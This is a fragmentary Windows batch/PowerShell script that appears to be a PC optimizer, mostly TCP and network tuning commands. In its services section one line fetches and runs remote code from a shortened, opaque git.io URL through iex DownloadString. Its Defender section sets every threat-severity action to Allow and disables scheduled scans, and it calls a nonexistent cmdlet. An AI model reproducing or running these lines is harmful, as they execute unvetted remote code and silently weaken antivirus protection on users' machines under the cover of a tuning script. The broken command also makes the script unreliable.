...
:EServices
cls
Powershell iex ((New-Object System.Net.WebClient).DownloadString('https://git.io/JceYM'))
...
netsh int tcp set global congestionprovider=default
Set-NetTCPSetting -SettingName InternetCustom -CongestionProvider Default
netsh int tcp set supplemental Internet congestionprovider=default
...
netsh int tcp set global autotuninglevel=normal
netsh int tcp set global chimney=disabled
start powershell.exe /k powershell Set-NetOffloadGlobalSetting -Chimney Disabled
netsh int tcp set global netdma=disabled
netsh int tcp set global rss=enabled
netsh int tcp set global rsc=disabled
Set-NetOffloadGlobalSetting -PacketCoalescingFilter enabled
...
powershell.exe -command "Delete-MpPreference -ExclusionExtension ".exe""
...
powershell.exe -command "Set-MpPreference -MAPSReporting 1"
powershell.exe -command "Set-MpPreference -HighThreatDefaultAction 6 -Force"
powershell.exe -command "Set-MpPreference -ModerateThreatDefaultAction 6"
powershell.exe -command "Set-MpPreference -LowThreatDefaultAction 6"
powershell.exe -command "Set-MpPreference -SevereThreatDefaultAction 6"
powershell.exe -command "Set-MpPreference -ScanScheduleDay 8"
powershell.exe -command "Reg del "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /f"
